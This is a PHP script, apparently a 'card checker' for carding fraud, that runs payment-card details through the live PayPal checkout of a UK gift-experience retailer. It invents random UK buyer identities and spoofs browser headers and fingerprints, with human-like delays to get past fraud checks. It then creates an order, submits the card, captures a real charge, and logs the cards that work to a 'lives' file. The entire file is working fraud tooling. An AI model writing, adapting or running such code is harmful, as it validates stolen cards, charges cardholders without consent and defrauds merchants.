<?php
/**
 * TheGiftExperience.co.uk PayPal Advanced Checker
 * Compatible with runner_main.js
 * Usage: php b3ppccn.php "5370320118501876|06|28|000"
 */

error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
set_time_limit(0);
date_default_timezone_set('Europe/London');

ob_start();

// Global error handler to ensure JSON output
set_error_handler(function($severity, $message, $file, $line) {
    if (ob_get_level() > 0) {
        while (ob_get_level() > 0) ob_end_clean();
    }
    echo json_encode(['place' => 'dead', 'message' => 'Script Error: ' . $message, 'card' => '']);
    exit(0);
});

function output_json($place, $message, $card, $cookie = null) {
    if ($cookie) @unlink($cookie);
    while (ob_get_level() > 0) ob_end_clean();
    echo json_encode(['place' => $place, 'message' => $message, 'card' => $card], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit(0);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if(count($str) < 2) return false;
    $str = explode($end, $str[1]);
    return $str[0];
}

function random_strings($length_of_string) {
    return substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'), 0, $length_of_string);
}

function random_uk_name() {
    $first_names = array('James', 'Oliver', 'George', 'Harry', 'Jack', 'Emily', 'Olivia', 'Amelia', 'Isla', 'Ava');
    $last_names = array('Smith', 'Jones', 'Williams', 'Taylor', 'Brown', 'Davies', 'Evans', 'Wilson', 'Thomas', 'Roberts');
    return array('first' => $first_names[array_rand($first_names)], 'last' => $last_names[array_rand($last_names)]);
}

function random_uk_address() {
    $streets = array('High Street', 'Station Road', 'Main Street', 'Park Road', 'Church Lane', 'Manor Road', 'Queens Road', 'London Road', 'Victoria Road', 'Green Lane');
    $cities = array('London', 'Manchester', 'Birmingham', 'Leeds', 'Liverpool', 'Bristol', 'Sheffield', 'Edinburgh', 'Leicester', 'Coventry');
    $counties = array('Greater London', 'Greater Manchester', 'West Midlands', 'West Yorkshire', 'Merseyside', 'Bristol', 'South Yorkshire', 'Midlothian', 'Leicestershire', 'West Midlands');
    $postcodes = array('SW1A 1AA', 'M1 1AE', 'B1 1AA', 'LS1 1BA', 'L1 8JQ', 'BS1 5TR', 'S1 2JE', 'EH1 1YZ', 'LE1 1AA', 'CV1 1AA');
    $index = array_rand($cities);
    return array('street' => rand(1, 99) . ' ' . $streets[array_rand($streets)], 'city' => $cities[$index], 'postcode' => $postcodes[$index], 'county' => $counties[$index]);
}

function random_uk_phone() {
    return '01' . rand(200, 999) . ' ' . rand(100000, 999999);
}

function random_uk_email($name) {
    $domains = array('gmail.com', 'yahoo.co.uk', 'hotmail.com', 'outlook.com', 'btinternet.com');
    return strtolower($name['first'] . '.' . $name['last'] . rand(100, 999) . '@' . $domains[array_rand($domains)]);
}

function generate_paypal_uid() {
    $timestamp = time();
    $random = bin2hex(random_bytes(8));
    $microtime = substr(str_replace('.', '', microtime(true)), -6);
    return 'uid_' . $random . '_' . $timestamp . '_' . $microtime . '_' . base_convert(rand(1000, 9999), 10, 36);
}

function curl_request($url, $post = false, $headers = false, $followLocation = true, $cookie = false) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $followLocation);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    
    if (!$headers) {
        $headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        );
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, (is_array($post)) ? http_build_query($post) : $post);
    }
    
    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIESESSION, false);
    }
    
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    
    if (curl_errno($ch)) {
        $error = curl_error($ch);
        $errno = curl_errno($ch);
        curl_close($ch);
        throw new Exception('[CURL_ERROR] #' . $errno . ': ' . $error);
    }
    
    if ($response === false) {
        curl_close($ch);
        throw new Exception('[NO_RESPONSE] CURL returned false');
    }
    
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers_received = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    curl_close($ch);
    
    if ($cookie && file_exists($cookie)) clearstatcache(true, $cookie);
    
    return ['headers' => $headers_received, 'body' => $body, 'info' => $info];
}

// Direct connection without proxy

if(isset($argv[1])) {
    $card_input = $argv[1];
} else {
    $card_input = $_GET['card'] ?? '';
}

$card_clean = preg_replace('/[^0-9|]+/', '', $card_input);
list($cc, $mes, $ano, $cvv) = explode("|", $card_clean . "||||");

if(empty($cc)) list($cc, $mes, $ano, $cvv) = explode("|", "5370320118501876|06|28|000");
if(strlen($ano) == 4) $ano = substr($ano, 2, 2);
if(empty($cvv) || $cvv === 'xxx') $cvv = rand(100, 999);

if(empty($cc) || empty($mes) || empty($ano)) {
    $error_msg = 'Invalid card format';
    @file_put_contents(getcwd() . '/error.txt', $card_input . ' ' . date('F j, Y, g:i a') . ' MSG: ' . $error_msg . "\r\n", FILE_APPEND);
    output_json('dead', $error_msg, $card_input);
}

// No proxy configuration - using direct connection

$cookie = tempnam(sys_get_temp_dir(), 'giftexp_' . getmypid() . '_' . microtime(true) . '_' . rand(10000, 99999) . '_');

$name = random_uk_name();
$address = random_uk_address();
$email = random_uk_email($name);
$phone = random_uk_phone();
$full_name = $name['first'] . ' ' . $name['last'];

$product_id = 74291;
$product_url = 'https://www.thegiftexperience.co.uk/activity/ring-for-gin-bell';

// Single attempt with direct connection
    
    try {
        
        // STEP 0: Visit Product Page
        $product_headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        );
        
        // Session warming - visit homepage first
        $homepage_headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        );
        
        $homepage_response = curl_request('https://www.thegiftexperience.co.uk/', false, $homepage_headers, true, $cookie);
        usleep(rand(1000000, 2000000));
        
        $response = curl_request($product_url, false, $product_headers, true, $cookie);
        if($response['info']['http_code'] !== 200) {
            throw new Exception('[PRODUCT_PAGE_FAILED] HTTP Code: ' . $response['info']['http_code']);
        }
        
        usleep(rand(1500000, 3500000));
        
        // STEP 1: Add to Cart
        $boundary = '----WebKitFormBoundary' . random_strings(16);
        $add_cart_headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'Origin: https://www.thegiftexperience.co.uk',
            'Referer: ' . $product_url,
            'sec-ch-ua: "(Not(A:Brand\";v=\"99\", \"Opera\";v=\"114"',
            'sec-ch-ua-mobile: ?1',
            'sec-ch-ua-platform: "Android"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        );
        
        $add_cart_data = "--$boundary\r\nContent-Disposition: form-data; name=\"instance_id\"\r\n\r\n$product_id\r\n--$boundary--\r\n";
        
        $response = curl_request('https://www.thegiftexperience.co.uk/secure/index:addtobasket', $add_cart_data, $add_cart_headers, true, $cookie);
        if($response['info']['http_code'] !== 200) {
            throw new Exception('[ADD_CART_FAILED] HTTP Code: ' . $response['info']['http_code']);
        }
        
        usleep(rand(2000000, 4000000));
        
        // STEP 2: Create PayPal Order
        $create_order_headers = array(
            'Accept: */*',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json',
            'Origin: https://www.thegiftexperience.co.uk',
            'Referer: https://www.thegiftexperience.co.uk/secure/index:addtobasket',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin'
        );
        
        $response = curl_request('https://www.thegiftexperience.co.uk/secure/index:paypaladvanced_createorder', json_encode(['paymentSource' => 'card']), $create_order_headers, true, $cookie);
        if($response['info']['http_code'] !== 200) {
            throw new Exception('[CREATE_ORDER_FAILED] HTTP Code: ' . $response['info']['http_code']);
        }
        
        $create_result = json_decode($response['body'], true);
        $paypal_order_id = $create_result['id'] ?? null;
        $paypal_status = $create_result['status'] ?? '';
        
        if(!$paypal_order_id || $paypal_status !== 'CREATED') {
            throw new Exception('[CREATE_ORDER_FAILED] Invalid response');
        }
        
        usleep(rand(1800000, 3200000));
        
        // STEP 3: Get PayPal Access Token
        $session_id = generate_paypal_uid();
        $client_metadata_id = $session_id;
        $card_fields_session_id = generate_paypal_uid();
        $sdk_correlation_id = bin2hex(random_bytes(16)) . '-' . substr(md5(uniqid('', true)), 0, 12) . '-' . base_convert(time(), 10, 36);
        $client_id = 'AfxyTYGBewwYd_KgmekT6P66_cxMnQrUSVjxJKhL0fkXdQ6MP2If4nRIh7kjUqo-hV8vNMY2In-UOH9w';
        
        $sdk_meta_data = [
            'url' => 'https://www.paypal.com/sdk/js?client-id=' . $client_id . '&currency=GBP&components=buttons,card-fields,funding-eligibility,applepay,googlepay&enable-funding=paylater',
            'attrs' => ['data-sdk-integration-source' => 'developer-studio']
        ];
        
        $card_field_params = [
            'type' => 'number',
            'clientID' => $client_id,
            'sessionID' => $session_id,
            'clientMetadataID' => $client_metadata_id,
            'cardFieldsSessionID' => $card_fields_session_id,
            'env' => 'production',
            'debug' => 'false',
            'locale.country' => 'US',
            'locale.lang' => 'en',
            'sdkMeta' => base64_encode(json_encode($sdk_meta_data)),
            'style.input.font-size' => '16px',
            'style.input.font-family' => 'Helvetica,Arial,sans-serif',
            'style.input.color' => 'black',
            'style.input.height' => '45px',
            'style.input.border' => '1px solid #ced4da',
            'style..invalid.box-shadow' => 'none',
            'style..invalid.border' => '1px solid #d9360b',
            'style.:focus.box-shadow' => 'none',
            'disable-card' => '',
            'currency' => 'GBP',
            'intent' => 'capture',
            'commit' => 'true',
            'vault' => 'false',
            'sdkCorrelationID' => $sdk_correlation_id
        ];
        
        $card_field_iframe_url = 'https://www.paypal.com/smart/card-field?' . http_build_query($card_field_params);
        
        $iframe_headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: iframe',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: cross-site',
            'upgrade-insecure-requests: 1'
        );
        
        $access_token = '';
        
        try {
            $iframe_response = curl_request($card_field_iframe_url, false, $iframe_headers, true, $cookie);
            if($iframe_response['info']['http_code'] === 200) {
                if(preg_match('/"facilitatorAccessToken"\s*:\s*"([^"]+)"/', $iframe_response['body'], $matches)) {
                    $access_token = $matches[1];
                } elseif(preg_match('/"accessToken"\s*:\s*"([^"]+)"/', $iframe_response['body'], $matches)) {
                    $access_token = $matches[1];
                }
            }
        } catch (Exception $e) {
            // Continue without access token
        }
        
        usleep(800000);
        
        // STEP 4: Confirm Payment Source
        $card_expiry = '20' . $ano . '-' . str_pad($mes, 2, '0', STR_PAD_LEFT);
        
        $card_payload = [
            'payment_source' => [
                'card' => [
                    'number' => $cc,
                    'expiry' => $card_expiry,
                    'security_code' => $cvv,
                    'billing_address' => [
                        'address_line_1' => $address['street'],
                        'admin_area_1' => $address['county'],
                        'admin_area_2' => $address['city'],
                        'country_code' => 'GB',
                        'postal_code' => $address['postcode']
                    ]
                ]
            ]
        ];
        
        $browser_fingerprint = base64_encode(json_encode([
            'timezone' => 'Europe/London',
            'screen_resolution' => '1920x1080',
            'color_depth' => 24,
            'language' => 'en-US',
            'platform' => 'Win32',
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'timestamp' => time() * 1000
        ]));
        
        $confirm_headers = array(
            'Accept: application/json',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json',
            'Origin: https://www.paypal.com',
            'Paypal-Client-Metadata-Id: ' . $client_metadata_id,
            'PayPal-Client-Context-Id: ' . $browser_fingerprint,
            'Prefer: return=representation',
            'Priority: u=1, i',
            'Referer: ' . $card_field_iframe_url,
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'sec-fetch-storage-access: active'
        );
        
        if(!empty($access_token)) {
            $confirm_headers[] = 'Authorization: Bearer ' . $access_token;
        }
        
        $confirm_response = curl_request(
            'https://www.paypal.com/v2/checkout/orders/' . $paypal_order_id . '/confirm-payment-source',
            json_encode($card_payload),
            $confirm_headers,
            true,
            $cookie
        );
        
        $confirm_result = json_decode($confirm_response['body'], true);
        
        $card_brand = '';
        $card_type = '';
        $issuing_bank = '';
        $bin_country = '';
        
        if($confirm_response['info']['http_code'] === 200) {
            $card_brand = $confirm_result['payment_source']['card']['brand'] ?? '';
            $card_type = $confirm_result['payment_source']['card']['type'] ?? '';
            $bin_details = $confirm_result['payment_source']['card']['bin_details'] ?? [];
            $issuing_bank = $bin_details['issuing_bank'] ?? '';
            $bin_country = $bin_details['bin_country_code'] ?? '';
        } else {
            if(isset($confirm_result['name'])) {
                $paypal_details = $confirm_result['details'][0] ?? [];
                $paypal_issue = $paypal_details['issue'] ?? '';
                $paypal_description = $paypal_details['description'] ?? '';
                
                if(strpos($paypal_description, 'Invalid card number') !== false || strpos($paypal_issue, 'INVALID_PARAMETER') !== false) {
                    $card_full = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;
                    $card_output = $cc . '|' . $mes . '|' . $ano;
                    @file_put_contents(getcwd() . '/error.txt', $card_full . ' ' . date('F j, Y, g:i a') . ' MSG: Invalid card number\r\n', FILE_APPEND);
                    output_json('dead', 'Invalid card number', $card_output, $cookie);
                }
                
                if($paypal_issue === 'PAYER_CANNOT_PAY') {
                    $card_full = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;
                    $card_output = $cc . '|' . $mes . '|' . $ano;
                    $card_info_str = '';
                    if ($card_brand) $card_info_str .= " | $card_brand";
                    if ($card_type) $card_info_str .= " $card_type";
                    if ($issuing_bank) $card_info_str .= " | Bank: $issuing_bank";
                    $error_msg = 'Declined - Card Cannot Be Used' . $card_info_str;
                    @file_put_contents(getcwd() . '/error.txt', $card_full . ' ' . date('F j, Y, g:i a') . ' MSG: ' . $error_msg . "\r\n", FILE_APPEND);
                    output_json('dead', $error_msg, $card_output, $cookie);
                }
            }
        }
        
        usleep(rand(1500000, 2800000));
        
        // STEP 5: Capture Payment
        $capture_headers = array(
            'Accept: */*',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json',
            'Origin: https://www.thegiftexperience.co.uk',
            'Referer: https://www.thegiftexperience.co.uk/secure/index:addtobasket',
            'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin'
        );
        
        $capture_payload = json_encode([
            'shippingAddress' => [
                'phoneNumber' => $phone,
                'name' => $full_name,
                'address1' => $address['street'],
                'address2' => '',
                'administrativeArea' => $address['county'],
                'locality' => $address['city'],
                'postalCode' => $address['postcode'],
                'countryCode' => 'GB'
            ],
            'email' => $email
        ]);
        
        $capture_response = curl_request(
            'https://www.thegiftexperience.co.uk/secure/index:paypaladvanced_capture?id=' . $paypal_order_id,
            $capture_payload,
            $capture_headers,
            true,
            $cookie
        );
        
        if($capture_response['info']['http_code'] !== 200) {
            throw new Exception('[CAPTURE_FAILED] HTTP Code: ' . $capture_response['info']['http_code']);
        }
        
        $capture_result = json_decode($capture_response['body'], true);
        
        $capture_status = $capture_result['status'] ?? '';
        $purchase_units = $capture_result['purchase_units'][0] ?? [];
        $payments = $purchase_units['payments'] ?? [];
        $captures = $payments['captures'][0] ?? [];
        
        $capture_id = $captures['id'] ?? '';
        $capture_transaction_status = $captures['status'] ?? '';
        $processor_response = $captures['processor_response'] ?? [];
        
        $response_code = $processor_response['response_code'] ?? '';
        $cvv_code = $processor_response['cvv_code'] ?? '';
        $avs_code = $processor_response['avs_code'] ?? '';
        
        $card_full = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;
        $card_output = $cc . '|' . $mes . '|' . $ano;
        
        // LIVE
        if($capture_status === 'COMPLETED' && $capture_transaction_status === 'COMPLETED') {
            $amount = $captures['amount']['value'] ?? '0.00';
            $currency = $captures['amount']['currency_code'] ?? 'GBP';
            $card_info = '';
            if ($card_brand) $card_info .= " | $card_brand";
            if ($card_type) $card_info .= " $card_type";
            if ($issuing_bank) $card_info .= " | Bank: $issuing_bank";
            if ($bin_country) $card_info .= " | Country: $bin_country";
            $success_msg = "Charged £{$amount} $currency | TXN: $capture_id" . $card_info;
            @file_put_contents(getcwd() . '/lives.txt', $card_full . ' ' . date('F j, Y, g:i a') . ' MSG: ' . $success_msg . "\r\n", FILE_APPEND);
            output_json('live', $success_msg, $card_output, $cookie);
        }
        
        // DECLINED
        $response_code_map = [
            '0000' => 'Approved', '5110' => 'Card Declined - Generic Decline', '5120' => 'Insufficient Funds',
            '5130' => 'Invalid Card Number', '5140' => 'Invalid Expiration Date', '5150' => 'Invalid CVV',
            '5160' => 'Card Expired', '5170' => 'Declined - Do Not Honor', '5180' => 'Declined - Transaction Not Permitted',
            '5190' => 'Declined - Exceeds Withdrawal Limit', '5200' => 'Declined - Issuer or Switch Inoperative',
            '5210' => 'Declined - Lost or Stolen Card', '5220' => 'Declined - Restricted Card',
            '5230' => 'Declined - Security Violation', '5240' => 'Declined - Activity Limit Exceeded',
            '5250' => 'Declined - Invalid Transaction', '5260' => 'Declined - Card Not Supported',
            '5270' => 'Declined - Pickup Card', '5280' => 'Declined - Suspected Fraud',
            '5290' => 'Declined - Revocation of Authorization', '5300' => 'Declined - Issuer System Malfunction'
        ];
        
        $cvv_code_map = [
            'M' => 'CVV Match', 'N' => 'CVV No Match', 'P' => 'CVV Not Processed', 'S' => 'CVV Should Be Present',
            'U' => 'CVV Unavailable', 'X' => 'CVV No Response', 'D' => 'CVV Mismatch', 'I' => 'CVV Not Provided', 'Y' => 'CVV Match'
        ];
        
        $avs_code_map = [
            'A' => 'AVS Address Match Only', 'B' => 'AVS Address Match (International)', 'C' => 'AVS No Match (International)',
            'D' => 'AVS Exact Match (International)', 'E' => 'AVS Not Supported', 'F' => 'AVS Address & Postal Match (UK)',
            'G' => 'AVS Not Supported (Non-US)', 'I' => 'AVS Not Verified (International)', 'M' => 'AVS Exact Match (International)',
            'N' => 'AVS No Match', 'P' => 'AVS Postal Match (International)', 'R' => 'AVS Retry', 'S' => 'AVS Service Not Supported',
            'U' => 'AVS Unavailable', 'W' => 'AVS 9-Digit Zip Match', 'X' => 'AVS Exact Match', 'Y' => 'AVS Exact Match', 'Z' => 'AVS 5-Digit Zip Match'
        ];
        
        $decline_parts = [];
        if(!empty($response_code)) $decline_parts[] = $response_code_map[$response_code] ?? "Processor Code: $response_code";
        if(!empty($cvv_code) && $cvv_code !== 'M' && $cvv_code !== 'Y') $decline_parts[] = $cvv_code_map[$cvv_code] ?? "CVV: $cvv_code";
        if(!empty($avs_code) && $avs_code !== 'Y' && $avs_code !== 'X' && $avs_code !== 'U' && $avs_code !== 'S' && $avs_code !== 'E') {
            $decline_parts[] = $avs_code_map[$avs_code] ?? "AVS: $avs_code";
        }
        
        if(empty($decline_parts)) {
            if($capture_transaction_status === 'DECLINED') {
                $decline_parts[] = 'Transaction Declined';
            } elseif(!empty($capture_transaction_status)) {
                $decline_parts[] = "Status: $capture_transaction_status";
            } else {
                $decline_parts[] = 'Payment Failed';
            }
        }
        
        $decline_message = implode(' | ', $decline_parts);
        $card_info = '';
        if ($card_brand) $card_info .= " | $card_brand";
        if ($card_type) $card_info .= " $card_type";
        if ($issuing_bank) $card_info .= " | Bank: $issuing_bank";
        if ($bin_country) $card_info .= " | Country: $bin_country";
        
        $dead_msg = $decline_message . $card_info;
        
        @file_put_contents(getcwd() . '/error.txt', $card_full . ' ' . date('F j, Y, g:i a') . ' MSG: ' . $dead_msg . "\r\n", FILE_APPEND);
        output_json('dead', $dead_msg, $card_output, $cookie);
        
    } catch (Exception $e) {
        $error_msg = $e->getMessage();
        $card_full = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;
        $card_output = $cc . '|' . $mes . '|' . $ano;
        @file_put_contents(getcwd() . '/error.txt', $card_full . ' ' . date('F j, Y, g:i a') . ' MSG: ' . $error_msg . "\r\n", FILE_APPEND);
        output_json('dead', $error_msg, $card_output, $cookie);
    }

// Script should not reach here due to try-catch block above
?>
